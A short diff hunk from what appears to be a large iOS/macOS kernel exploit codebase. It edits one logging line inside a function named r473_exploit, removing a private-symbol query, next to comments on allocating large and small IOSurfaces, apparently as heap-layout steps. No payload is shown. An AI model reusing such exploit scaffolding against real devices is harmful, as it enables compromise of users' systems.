@@ -17719,7 +17719,7 @@ static void r473_exploit(void) {
     mach_port_t large_entry = IOSurfaceCreateMachPort(large_surf);
     rlog("    large: %d pages, entry=0x%x, phys_contig=%d\n",
          R473_LARGE_PG, large_entry,
-         IOSurfaceGetPropertyMaximum(kIOSurfaceIsPhysicallyContiguous));
+         0 /* phys_contig query removed — private symbol */);
 
     /* Phase 2: Create SMALL IOSurface (1 page, 16K) */
     rlog("\n  --- Phase 2: Small IOSurface (%d page) ---\n", R473_SMALL_PG);
